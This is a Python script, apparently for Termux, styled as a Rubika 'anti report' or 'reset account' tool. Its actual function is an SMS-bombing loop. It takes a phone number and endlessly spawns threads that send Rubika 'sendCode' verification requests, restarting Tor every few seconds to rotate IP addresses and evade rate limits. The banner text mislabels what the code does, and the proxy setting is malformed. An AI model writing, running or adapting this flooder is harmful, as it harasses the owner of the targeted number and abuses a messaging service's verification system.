import os
import time
import requests
import sys
from threading import Thread
from colorama import Fore
from time import sleep
proxy = {"https": "127.0.0.1.8000"}
os.system("pkg install tor")
os.system("pip install requests")
os.system("clear")
print(Fore.GREEN)
print("""                 F / H 
""")
sleep(1)
os.system("clear")
print(Fore.BLUE)
time.sleep(0.5)
print ("yes")
m = """


reset account


/////////////////////
//////////un username
///////////////////
/////////anti report
||||||||||||||||||||||||||||
//////////////////
////main no filtering, anti report
"""
for m in m:
        sys.stdout.write(m)
        sys.stdout.flush()
        time.sleep(0.03)

print ("")
print (Fore.YELLOW)
time.sleep(1)
print ()


#kh kh kh


def rubika(phone):
    #rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
        if "OK" in ruR.text:
            print ("ok thanks")
        else:
            print ("REPORTING USER")
    except:
        print ("req=ok user report by ryson no")

def main():
    phone = str(input("""
~~~~~~~~~~~~~~~~~~~
|||||||||||||||||||
|||====||★||====|||
|||====||★||====|||
||| black mester |||
|||||||||||||||||||
|||||||||||||||||||
|||||||||||||||||||
~~~~~~~~~~~~~~~~~~~

#666



             
          Number-reported for anti report [+98XXXXX] ⟩⟩⟩ """))
    while True:
        Thread(target=rubika, args=[phone]).start()
        os.system("killall -HUP tor")
        time.sleep(3)


if __name__ == "__main__":
    main()

os.system("tor")
